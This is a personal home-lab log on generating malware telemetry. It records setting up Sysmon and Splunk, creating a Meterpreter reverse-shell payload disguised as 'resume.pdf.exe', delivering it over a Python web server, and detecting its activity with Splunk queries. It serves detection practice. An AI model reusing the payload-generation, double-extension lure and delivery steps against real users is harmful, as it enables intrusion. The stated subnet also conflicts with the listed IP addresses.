

LAB LOG: Malware Analysis & Telemetry Generation
DATE: December 2025
AUTHOR: Aditya
============================================================

[1. NETWORK CONFIGURATION]
------------------------------------------------------------
Hypervisor: Oracle VirtualBox
Network Mode: Bridge Adaptor
Subnet: 10.0.2.0/24

Attacker Machine (Kali Linux):
- IP: 192.168.0.9
- Role: Command & Control (C2), Payload Generation
- Tools: Metasploit, Nmap, Python3 (SimpleHTTPServer)

Victim Machine (Windows 10):
- IP: 192.168.0.6
- Role: Target Endpoint
- Tools: Splunk Universal Forwarder, Sysmon (SwiftOnSecurity Config)

[2. EXECUTION LOG]
------------------------------------------------------------
STEP 1: Sysmon Configuration
- Installed Sysmon on Windows 10 to capture granular process data.
- Key Insight: Standard Windows logs (Event Viewer) don't show the parent-child 
  process relationship clearly, which is why Sysmon Event ID 1 is required.

STEP 2: Splunk Setup
- Installed Universal Forwarder on Windows.
- Edited 'inputs.conf' to point to the Splunk Indexer.
- PROBLEM FACED: Initially, Splunk wasn't receiving data.
- SOLUTION: I had to ensure the "Receiver" was enabled on port 9997 
  in the Splunk Enterprise settings.

STEP 3: Payload Generation
- Used msfvenom to create a reverse TCP shell.
- Command: msfvenom -p windows/x64/meterpreter/reverse_tcp ...
- File Name: resume.pdf.exe (Double extension trick to fool users).

STEP 4: The Attack
- Hosted the file using 'python3 -m http.server 80'.
- Downloaded file on Windows 10 via Edge browser.
- Executed file.
- Confirmed reverse shell connection on Kali (Meterpreter session opened).

[3. ANALYSIS NOTES]
------------------------------------------------------------
Observation 1:
Splunk Query used to find execution of our malware
```query
 index=endpoint Resume.pdf.exe
```

Network connections were visible in Splunk. I could see the internal Windows IP 
connecting back to the Kali IP on port 4444. 
The file 'resume.pdf.exe' immediately spawned 'cmd.exe'. This is highly suspicious 
behavior for a PDF file.

Observation 2:
Sysmon Event Code 1 provided the hash of the file. In a real scenario, 
I would upload this hash to VirusTotal to confirm it is malware.

Splunk Query used to find exact execution of malware and its operations
```
index=endpoint {process_guid} | table _time,ParentImage,Image,CommandLine
```
Observation 3:
Execution timing cmd.exe execution clearly visible.We can see that cmd.exe executed the commands like net user, net localgroup and ipconfig.
Thats clearly show suspicious control of malware.

[4. FUTURE IMPROVEMENTS]
------------------------------------------------------------
- Automate the payload delivery via email simulation.
- Create a Splunk Alert to trigger automatically when "resume.pdf.exe" runs.
- Test with different payloads to see if Windows Defender catches them.
